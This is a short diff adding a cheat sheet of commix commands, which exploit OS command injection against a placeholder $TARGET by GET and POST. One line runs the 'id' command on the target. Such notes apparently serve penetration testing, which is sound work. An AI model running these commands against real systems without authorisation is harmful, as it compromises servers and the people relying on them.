@@ -1,0 +1,5 @@
+# commix — OS command injection exploitation
+commix -u "https://$TARGET/page?param=test"
+commix -u "https://$TARGET/page" --data="param=test" --method=POST
+commix -u "https://$TARGET/page?param=test" --os-cmd="id"
+commix -u "https://$TARGET/page?param=test" --level=3
